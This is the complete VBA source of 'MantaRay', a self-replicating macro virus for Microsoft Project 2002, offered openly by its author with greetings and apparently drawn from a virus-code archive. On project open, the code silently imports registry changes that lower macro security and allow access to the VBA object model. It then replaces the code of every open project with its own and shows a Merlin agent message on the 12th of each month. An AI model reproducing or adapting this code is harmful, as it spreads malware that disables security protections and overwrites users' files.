'.MantaRay
'.early 2002 (when i got pj2002 beta)
'
'Its pretty much a plain vanilla project infector hacked to run under the forthcoming 
'and really really interesting (*cough*bullshit*cough) project 2002 or project Xp :)
'Its only really of note as few people code anything for project and its hopefully a first
'all self explanatory ... enjoy ;)
'
'greets and dedications to ... well y`know who you are
'
'AntiState
'
'----x-----
Private Sub Project_Open(ByVal pj As Project)
'
first = Dir("c:\mantaray.reg")
If first <> "mantaray.reg" Then
Open "c:\mantaray.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\MS Project\Security]"
Print #1, """Level""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\MS Project\Security]"
Print #1, """AccessVBOM""=dword:00000001"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\MS Project\Security]"
Print #1, """DontTrustInstalledFiles""=dword:00000000"
Close 1
Shell "regedit /s c:\mantaray.reg"
GoTo out
End If
For Each Z In Projects
On Error Resume Next
Set target = Z.VBProject.VBComponents(1).CodeModule
Set tp = ThisProject.VBProject.VBComponents(1).CodeModule
If target.Lines(2, 1) <> "'" Then
target.DeleteLines 1, target.CountOfLines
target.InsertLines 1, tp.Lines(1, tp.CountOfLines)
End If
Next Z
Set temp = Application.VBE.VBProjects(1).VBComponents(1).CodeModule
If temp.Lines(2, 1) <> Chr(39) Then
temp.DeleteLines 1, temp.CountOfLines
temp.InsertLines 1, tp.Lines(1, tp.CountOfLines)
End If
out:
If (Day(Now)) = 12 Then
On Error GoTo gone
Set speaky = CreateObject("Agent.Control.1")
speaky.connected = True
If VBA.IsObject(speaky) Then
speaky.Characters.Load "Merlin", "Merlin.acs"
Set merl = speaky.Characters("Merlin")
End If
With merl
.Show
.play Animation:="Read"
.speak "The Stars are out tonight , and your the brightest one shining in my sky..."
.speak "would you be my best friend , if i offered you my heart"
.speak "cuz its already yours...."
.speak "yesterday , today , tomorrow , forever ... all your office products are belong to us"
.speak "with Love always .... the antistate tortoise"
.hide
End With
Do Until merl.hide.Status = 0
DoEvents
Loop
End If
gone:
'[AsT]
'Metaphase/Tantrum
End Sub
Back to index
